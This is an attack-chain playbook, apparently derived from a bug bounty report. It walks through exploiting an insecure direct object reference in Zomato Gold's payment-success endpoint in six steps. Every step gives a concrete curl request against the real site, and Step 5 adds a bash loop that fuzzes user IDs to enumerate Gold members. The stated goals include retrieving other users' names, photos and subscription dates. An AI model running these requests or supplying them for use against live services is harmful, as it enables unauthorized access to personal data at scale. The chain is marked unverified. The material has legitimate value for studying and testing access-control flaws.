# IDOR in Zomato Gold Payment Endpoint to Enumerate and Access User Subscriptions

Multi-stage attack chain demonstrating a complete IDOR workflow to access unauthorized Zomato Gold subscription details and enumerate all Gold members.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Access Endpoint with Known Params] --> B[Modify Subscription ID]
    B --> C[Access with Subscription ID Only]
    C --> D[Check Membership via User ID]
    D --> E[Fuzz User IDs for Enumeration]
    E --> F[Retrieve Full Details with Pair]
    F --> G[Objective: Enumerate and Access Subscriptions]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#9b59b6
    style G fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Web platform
- Zomato Gold subscription service
- No specific ports required (HTTPS on port 443)

### Initial Access Requirements

- Valid session or public access to Zomato website
- No credentials needed for the endpoint
- Network access to www.zomato.com

## Detailed Attack Procedures

### Step 1: Access Payment Success Endpoint with Known Parameters
procedure: [[procedures/Access-Zomato-Gold-Payment-Success-Endpoint]]

**Objective**: Observe normal behavior of the payment success endpoint with a known subscription_id and user_id to establish baseline.

**Instructions**: Use [[commands/curl-access-known-endpoint]] to visit the endpoint:

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?subscription_id=██████████&user_id=█████████" -i
```

**Expected Output**: Normal response showing your own subscription details.

**Success Indicators**:
- HTTP 200 response with subscription info
- No errors or redirects

### Step 2: Modify Subscription ID for Unauthorized Access
procedure: [[procedures/Modify-Subscription-ID-for-Unauthorized-Access]]

**Objective**: Manipulate the subscription_id to access details of other users' memberships without authorization.

**Instructions**: Alter the subscription_id parameter using [[commands/curl-modify-subscription-id]]:

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?subscription_id=123456&user_id=█████████" -i
```

**Expected Output**: Response reveals start date (e.g., 22 Dec 2017), end date (e.g., 22 Jun 2018), and plan (e.g., 6 month plan).

**Success Indicators**:
- Unauthorized details returned without ownership check
- No 403 or authorization error

### Step 3: Access Endpoint with Subscription ID Only
procedure: [[procedures/Access-Endpoint-with-Subscription-ID-Only]]

**Objective**: Remove user_id to confirm details are accessible solely via subscription_id.

**Instructions**: Omit user_id using [[commands/curl-subscription-id-only]]:

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?subscription_id=███████" -i
```

**Expected Output**: Still reveals subscription details tied to the membership ID.

**Success Indicators**:
- Details exposed without user_id
- Confirms lack of validation

### Step 4: Check Gold Membership via User ID Redirect
procedure: [[procedures/Check-Gold-Membership-via-User-ID-Redirect]]

**Objective**: Use only user_id to detect Gold membership through redirect behavior.

**Instructions**: Supply user_id alone with [[commands/curl-user-id-only]]:

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?user_id=███████" -i -L
```

**Expected Output**: 301 redirect to endpoint with subscription_id if Gold member (e.g., to ?subscription_id=212504).

**Success Indicators**:
- 301 redirect revealing membership ID
- No redirect for non-members

### Step 5: Fuzz User IDs to Enumerate Gold Members
procedure: [[procedures/Fuzz-User-IDs-to-Enumerate-Gold-Members]]

**Objective**: Enumerate all Gold members by fuzzing user_id and observing redirects.

**Instructions**: Configure Burp Suite Intruder or use scripted fuzzing with [[commands/curl-fuzz-user-ids]] (simplified; use tool for scale):

```bash
# Example single fuzz; scale with loop or Burp
for uid in {1000..2000}; do curl -X GET "https://www.zomato.com/gold/payment-success?user_id=$uid" -i -L -w "%{http_code} %{redirect_url}\n"; done
```

**Expected Output**: 301 redirects for valid Gold members, exposing subscription_ids.

**Success Indicators**:
- List of user_ids with redirects
- Enumerated membership IDs

### Step 6: Retrieve Full Subscription Details with Enumerated Pair
procedure: [[procedures/Retrieve-Full-Subscription-Details-with-Enumerated-Pair]]

**Objective**: Combine enumerated user_id and subscription_id to access complete user details.

**Instructions**: Access with pair using [[commands/curl-full-details-retrieve]]:

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?subscription_id=179268&user_id=███████" -i
```

**Expected Output**: Full details including user photo, name, membership ID, start/end dates, plan duration.

**Success Indicators**:
- Complete privacy violation data retrieved
- Photos and names exposed

## Attack Chain Summary

### Key Achievements

1. Unauthorized access to subscription validity details via IDOR.
2. Enumeration of all Zomato Gold members through fuzzing.
3. Retrieval of sensitive user information including photos and names.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Account Discovery]]

### MITRE ATT&CK Tactics

- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
